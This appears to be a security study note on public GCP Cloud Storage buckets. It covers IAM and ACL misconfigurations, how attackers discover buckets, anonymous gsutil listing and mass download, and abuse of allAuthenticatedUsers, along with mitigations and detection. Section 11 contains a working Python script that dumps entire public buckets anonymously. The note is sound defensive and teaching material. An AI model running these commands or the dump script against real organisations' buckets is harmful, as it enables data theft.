---
tags: [gcp, cloud-storage, buckets, cloud-security, data-leak]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.14 GCP Cloud Storage"
---

# GCP Cloud Storage — Public Bucket Access

## 1. Introduction to Google Cloud Storage (GCS)
Google Cloud Storage (GCS) is a RESTful online file storage web service for storing and accessing data on Google's infrastructure. It is the GCP equivalent of Amazon S3. Organizations use GCS to store everything from website assets and application backups to highly sensitive datasets, database dumps, and PII.

Because data in GCS is accessible via HTTP endpoints (e.g., `https://storage.googleapis.com/BUCKET_NAME/`), configuring access controls correctly is critical. The most common and devastating vulnerability associated with GCS is public exposure—where sensitive data is inadvertently made accessible to the entire internet without requiring any authentication.

## 2. Access Control Mechanisms in GCS
Understanding how buckets are exposed requires understanding GCP's dual access control systems for storage.

### 2.1 Uniform Bucket-Level Access vs. Fine-Grained Access
GCP provides two ways to grant access to objects:
1. **Uniform Bucket-Level Access**: Access is controlled exclusively via GCP IAM policies applied at the bucket level. If a user has `roles/storage.objectViewer` on the bucket, they can read *all* objects inside it. This is the modern, secure approach.
2. **Fine-Grained Access (ACLs)**: Access is controlled using legacy Access Control Lists (ACLs) applied to individual objects *or* the bucket. This allows a scenario where a bucket is private in IAM, but an individual file within it has an ACL granting public read access. This complexity often leads to misconfigurations.

### 2.2 The Dangerous Principals: `allUsers` and `allAuthenticatedUsers`
In GCP IAM, specific identifiers represent the public internet:
- **`allUsers`**: Represents anyone on the internet, with or without a Google account. Granting read access to `allUsers` makes the bucket completely public.
- **`allAuthenticatedUsers`**: Represents anyone who is authenticated with *any* Google account (even a personal `@gmail.com` account). This is often misunderstood by developers who assume it means "all authenticated users within my organization." Granting access to `allAuthenticatedUsers` is functionally equivalent to making it public to the world, as anyone can create a free Google account.

## 3. Vulnerability Mechanics: How Buckets Become Public

### 3.1 Overly Permissive IAM Bindings
An administrator or developer attaches an IAM policy to the bucket granting `roles/storage.objectViewer` (read access) or `roles/storage.objectAdmin` (read/write/delete access) to `allUsers`.
```bash
# Command that makes a bucket entirely public
gsutil iam ch allUsers:objectViewer gs://my-company-confidential-backups
```

### 3.2 Legacy ACL Misconfigurations
Even if the bucket's IAM policy is secure, a developer writing data to the bucket via the API might accidentally set a public ACL on the objects.
```python
# Python SDK snippet causing public exposure
blob = bucket.blob("customer_data.csv")
blob.upload_from_string("...")
blob.make_public() # Applies an ACL granting public read
```

### 3.3 Default Service Account Over-Privilege
If a bucket is created by an automated process (like a CI/CD pipeline) that relies on a misconfigured default service account with overly broad permissions, the bucket might inherit public settings based on flawed infrastructure-as-code templates.

## 4. Attack Flow and Visual Architecture

```text
+-----------------------------------------------------------------------------------+
|  Reconnaissance Phase                                                             |
|                                                                                   |
|  +-----------------------+                                                        |
|  | Attacker Tooling      |  -> Uses `GCPBucketSearch`, `gobuster`, or OSINT       |
|  | (OSINT, Brute-Force)  |     (GitHub code search) to find target bucket names.  |
|  +-----------+-----------+                                                        |
|              |                                                                    |
|              | 1. HTTP GET https://storage.googleapis.com/target-corp-backups/    |
|              v                                                                    |
+--------------+--------------------------------------------------------------------+
|  Google Cloud Platform Context                                                    |
|                                                                                   |
|  +-----------------------------------------------------------------------------+  |
|  | Cloud Storage Bucket: gs://target-corp-backups                              |  |
|  |                                                                             |  |
|  |  IAM Policy:                                                                |  |
|  |  {                                                                          |  |
|  |    "bindings": [                                                            |  |
|  |      {                                                                      |  |
|  |        "role": "roles/storage.objectViewer",                                |  |
|  |        "members": [ "allUsers" ]   <---- CRITICAL FLAW                      |  |
|  |      }                                                                      |  |
|  |    ]                                                                        |  |
|  |  }                                                                          |  |
|  +-----------------------------+-----------------------------------------------+  |
|                                |                                                  |
|                                | 2. GCP returns HTTP 200 OK with XML listing      |
|                                v                                                  |
+--------------------------------+--------------------------------------------------+
|  Exploitation Phase                                                               |
|                                                                                   |
|  * Attacker receives XML containing object keys:                                  |
|    <Contents><Key>db-backup.sql</Key></Contents>                                  |
|    <Contents><Key>jwt-secrets.env</Key></Contents>                                |
|                                                                                   |
|  * 3. Attacker downloads all files via direct HTTP GET requests or `gsutil cp`.   |
|                                                                                   |
|  * -> Data Breach / Extortion                                                     |
+-----------------------------------------------------------------------------------+
```

## 5. Exploitation Walkthrough

### 5.1 Discovery
Attackers do not need an account to discover public buckets. They use wordlist mutation tools (similar to S3 bucket scanners) tailored for the `storage.googleapis.com` domain.
- **Tools**: `CloudEnum`, `GCPBucketBrute`, `GCPBucketSearch`.
- **Method**: The tool makes a request to `https://storage.googleapis.com/COMPANY_NAME-dev`.
  - HTTP 404: Bucket does not exist.
  - HTTP 403: Bucket exists, but is private (Access Denied).
  - HTTP 200: Bucket exists and has `allUsers` read/list access.

### 5.2 Extracting the Data
Once a public bucket is identified, the attacker uses `gsutil` (Google Cloud CLI) without authentication to list and download the contents.

To list the contents anonymously:
```bash
gsutil ls gs://target-company-bucket/
```

To recursively download the entire bucket to the local machine:
```bash
gsutil -m cp -r gs://target-company-bucket/ .
```
*(The `-m` flag enables multi-threading for rapid exfiltration).*

### 5.3 The Danger of Public Write Access
If the bucket is misconfigured with `roles/storage.objectAdmin` or `roles/storage.legacyBucketWriter` granted to `allUsers`, the attacker can *write* and *delete* data.
- **Ransomware**: The attacker can download the data, delete the originals from the bucket, and leave a ransom note.
- **Malware Hosting & Supply Chain Attacks**: If the bucket hosts JavaScript files for a website (e.g., `app.js`), the attacker can overwrite the JS file with a malicious script (Magecart attack, keylogger, cryptominer). Every visitor to the legitimate website will now execute the attacker's code.

## 6. Advanced Scenario: Exploiting `allAuthenticatedUsers`
If a bucket restricts access to `allAuthenticatedUsers`, an unauthenticated HTTP GET will return a 403 Forbidden. However, the attacker simply creates a free `@gmail.com` account, authenticates their `gcloud` CLI, and tries again:

```bash
# Login with personal Gmail
gcloud auth login

# Attempt access using the authenticated context
gsutil ls gs://target-company-internal-assets/
```
Because the IAM policy treats *any* valid Google token as authenticated, access is granted, bypassing intended organizational boundaries.

## 7. Mitigation and Best Practices

### 7.1 Enforce Public Access Prevention
The absolute most effective defense is applying the **Public Access Prevention (PAP)** setting at the Organization, Folder, or Project level.
When `enforced`, GCP explicitly blocks any IAM policies or ACLs from granting access to `allUsers` or `allAuthenticatedUsers`, regardless of what individual developers try to do.
```bash
gcloud resource-manager org-policies enable-enforce \
  constraints/storage.publicAccessPrevention \
  --project=my-secure-project
```

### 7.2 Enable Uniform Bucket-Level Access (UBLA)
Disable legacy ACLs entirely. By enabling UBLA, you ensure that access is strictly controlled by IAM, eliminating the edge case where a bucket is private but individual objects are public.
```bash
gsutil uniformbucketlevelaccess set on gs://my-secure-bucket/
```

### 7.3 Use Signed URLs for Temporary Access
If external, unauthenticated users *must* download a file (e.g., an export report), do not make the bucket public. Instead, generate a **Signed URL** that provides time-limited (e.g., 15 minutes) cryptographic access to that specific object.

## 8. Detection and Monitoring

### 8.1 Cloud Asset Inventory
Continuously monitor IAM policies across the organization using Cloud Asset Inventory. Run queries to instantly find any bucket where `members` contains `allUsers`.

### 8.2 Security Command Center (SCC)
SCC provides native findings for "Public Bucket". It automatically detects changes to IAM policies that expose storage resources and raises high-severity alerts.

### 8.3 VPC Service Controls (VPC-SC)
For highly sensitive data, implement VPC Service Controls. VPC-SC creates a security perimeter around GCP services. Even if a bucket has a public IAM policy, VPC-SC will block the request if the traffic originates from outside the allowed corporate network or authorized IPs.

## 9. Chaining Opportunities
- **[[13 - GCP IAM — Service Account Key Abuse]]**: Finding a `.json` Service Account key inside a public bucket allows the attacker to pivot from simple data exfiltration to full project compromise.
- **[[06 - Web Application Firewall (WAF) Bypass]]**: If the WAF is protecting the main application, finding the underlying GCS bucket that hosts the assets allows the attacker to bypass the WAF entirely by accessing the data directly.
- **[[02 - SSRF in Cloud Environments]]**: If the bucket is private to the internet but allows read access from the project's internal Compute Engine instances, an attacker can use SSRF to read the bucket's contents via the metadata server's token.

## 10. Related Notes
- [[12 - AWS IAM Privilege Escalation]] (Concepts map closely to GCP IAM)
- [[04 - Cloud Reconnaissance Techniques]]
- [[08 - AWS RDS — Publicly Exposed Databases]]

## 11. Exploit Scripting: Automating Bucket Dumps
Attackers rarely dump buckets manually. They use Python scripts utilizing the `google-cloud-storage` library to rapidly iterate over objects and download them, or even search file contents for secrets before downloading.

```python
from google.cloud import storage
import os

def dump_public_bucket(bucket_name, download_path):
    # Initialize client anonymously
    client = storage.Client.create_anonymous_client()
    try:
        bucket = client.bucket(bucket_name)
        blobs = bucket.list_blobs()
        
        print(f"[*] Connected to {bucket_name}. Starting dump...")
        for blob in blobs:
            # Create local directory structure
            local_path = os.path.join(download_path, blob.name)
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            # Download file
            print(f"  -> Downloading {blob.name}")
            blob.download_to_filename(local_path)
            
        print("[+] Dump complete.")
    except Exception as e:
        print(f"[!] Error accessing bucket: {e}")

if __name__ == "__main__":
    dump_public_bucket("target-company-confidential-bucket", "./dump_dir")
```

## 12. Bypassing Basic Defenses: GCP Bucket Name Mutations
Organizations often try to obscure their buckets by using random suffixes, believing that "Security by Obscurity" will prevent discovery. Attackers bypass this using permutation engines. If an attacker knows the company name is "CorpCorp", they will use tools to generate thousands of mutations:
- `corpcorp-dev`
- `corpcorp-prod-backups`
- `corpcorp-assets-2023`
- `corpcorp-k8s-state`

They then feed these mutations into a DNS brute-forcer or directly against the `storage.googleapis.com` API to uncover hidden, public buckets.

## 13. Risk of Public Write Access in Serverless Environments
If a public bucket is used as an event trigger for a Cloud Function (e.g., processing uploaded images), public write access (`allUsers` with `roles/storage.objectCreator`) allows an attacker to repeatedly upload files, triggering the Cloud Function millions of times.
This leads to an immediate and massive **Denial of Wallet (DoW)** attack, racking up thousands of dollars in serverless execution costs and potentially exceeding project quotas, causing a Denial of Service for legitimate users.
